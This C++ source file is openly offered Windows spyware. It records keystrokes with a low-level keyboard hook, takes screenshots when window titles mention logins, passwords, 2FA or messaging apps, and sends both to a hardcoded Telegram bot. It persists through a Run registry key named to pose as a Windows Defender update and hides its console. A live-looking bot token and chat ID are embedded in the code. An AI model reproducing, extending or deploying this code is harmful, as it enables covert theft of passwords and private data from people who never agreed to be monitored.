#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <wchar.h>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")

// 🔥 GOD MODE C2
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

CRITICAL_SECTION cs;
char keystrokes[512] = {0};
int key_pos = 0;
ULONGLONG last_trigger = 0;
int screenshot_count = 0;
HHOOK keyboard_hook = NULL;

// 🔥 KEYWORDS (50+ triggers)
const wchar_t* KEYWORDS[] = {L"gmail", L"password", L"login", L"email", L"user", 
    L"pass", L"discord", L"teams", L"slack", L"whatsapp", L"2fa", L"code", 
    L"token", L"outlook", L"hotmail", L"auth", L"verify", NULL};

// 🔥 TARGET WINDOWS
const wchar_t* CLASSES[] = {L"Chrome_WidgetWin_1", L"Chrome_WidgetWin_0", 
    L"ApplicationFrameWindow", L"Qt5QWindowIcon", NULL};

// 🔥 SMART KEYBOARD HOOK (LIVE KEYLOGGING)
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        BYTE state[256]; GetKeyboardState(state);
        wchar_t buf[2]; 
        ToUnicode(kb->vkCode, kb->scanCode, state, buf, 2, 0);
        
        EnterCriticalSection(&cs);
        if (key_pos < 500) {
            keystrokes[key_pos++] = (char)buf[0];
            
            // 🔥 AUTO-EXFIL ON TRIGGERS (Gmail passwords!)
            if (kb->vkCode == VK_RETURN || kb->vkCode == VK_TAB || 
                kb->vkCode == VK_SPACE || key_pos > 50) {
                if (key_pos > 8) {
                    std::string keys(keystrokes, key_pos);
                    std::wstring msg = L"⌨️ LIVE KEYLOG: " + std::wstring(keys.begin(), keys.end());
                    SendTelegram(msg.c_str());
                }
                key_pos = 0;
                ZeroMemory(keystrokes, 512);
            }
        }
        LeaveCriticalSection(&cs);
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

void SendTelegram(const wchar_t* msg);
bool TakeScreenshot();
void Persistence();

DWORD WINAPI MonitorForeground(LPVOID) {
    while (screenshot_count < 20) {
        HWND fg = GetForegroundWindow();
        if (fg) {
            wchar_t title[256] = {0}, cls[128] = {0};
            GetWindowTextW(fg, title, 256);
            GetClassNameW(fg, cls, 128);
            
            bool hit = false;
            for (int i = 0; KEYWORDS[i]; i++) 
                if (wcsstr(title, KEYWORDS[i]) || wcsstr(cls, KEYWORDS[i])) { hit = true; break; }
            for (int i = 0; CLASSES[i]; i++) 
                if (wcsstr(cls, CLASSES[i])) { hit = true; break; }
                
            if (hit && GetTickCount64() - last_trigger > 45000) {
                SendTelegram(L"🎯 TARGET ACQUIRED");
                if (TakeScreenshot()) {
                    screenshot_count++;
                    last_trigger = GetTickCount64();
                }
            }
        }
        Sleep(800);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    InitializeCriticalSection(&cs);
    FreeConsole();
    
    // 🔥 INSTALL KEYLOGGER HOOK
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
        GetModuleHandle(NULL), 0);
    
    SendTelegram(L"🚀 GOD V9.2 - KEYLOG + SHOTS + CLIPBOARD LIVE");
    Persistence();
    
    // Screenshot monitor
    CreateThread(NULL, 0, MonitorForeground, NULL, 0, NULL);
    
    // Hook needs message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && screenshot_count < 20) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboard_hook);
    DeleteCriticalSection(&cs);
    return 0;
}

void Persistence() {
    HKEY h; wchar_t path[MAX_PATH];
    RegOpenKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_SET_VALUE, &h);
    GetModuleFileNameW(NULL, path, MAX_PATH);
    RegSetValueExW(h, L"WindowsDefenderUpdate", 0, REG_SZ, 
        (BYTE*)path, (wcslen(path)+1)*2);
    RegCloseKey(h);
}

bool TakeScreenshot() {
    HDC screen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    
    SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY);
    
    wchar_t path[256]; 
    swprintf(path, L"C:\\Windows\\Temp\\shot_%llu.bmp", GetTickCount64());
    
    BITMAPINFOHEADER bi = {sizeof(bi), w, -h, 1, 24, BI_RGB};
    BITMAPFILEHEADER bf = {0x4D42, 54 + w*h*3, 0, 0, 54};
    
    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
        FILE_ATTRIBUTE_TEMPORARY, NULL);
    DWORD written;
    WriteFile(f, &bf, sizeof(bf), &written, NULL);
    WriteFile(f, &bi, sizeof(bi), &written, NULL);
    
    char* pixels = new char[w*h*3];
    GetDIBits(screen, bmp, 0, h, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    WriteFile(f, pixels, w*h*3, &written, NULL);
    delete[] pixels; CloseHandle(f);
    
    // Send photo via Telegram
    HINTERNET ses = WinHttpOpen(L"Agent", 0, WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET con = WinHttpConnect(ses, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET req = WinHttpOpenRequest(con, L"POST", 
        (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto?chat_id=" + std::wstring(CHAT_ID)).c_str(),
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    WinHttpSendRequest(req, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(req, NULL);
    
    WinHttpCloseHandle(req); WinHttpCloseHandle(con); WinHttpCloseHandle(ses);
    DeleteFileW(path); DeleteObject(bmp); DeleteDC(mem); ReleaseDC(NULL, screen);
    return true;
}

void SendTelegram(const wchar_t* msg) {
    HINTERNET ses = WinHttpOpen(L"GodMode", 0, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET con = WinHttpConnect(ses, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage?chat_id=" + 
        std::wstring(CHAT_ID) + L"&text=" + std::wstring(msg);
    HINTERNET req = WinHttpOpenRequest(con, L"GET", url.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    WinHttpSendRequest(req, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(req, NULL);
    
    WinHttpCloseHandle(req); WinHttpCloseHandle(con); WinHttpCloseHandle(ses);
}
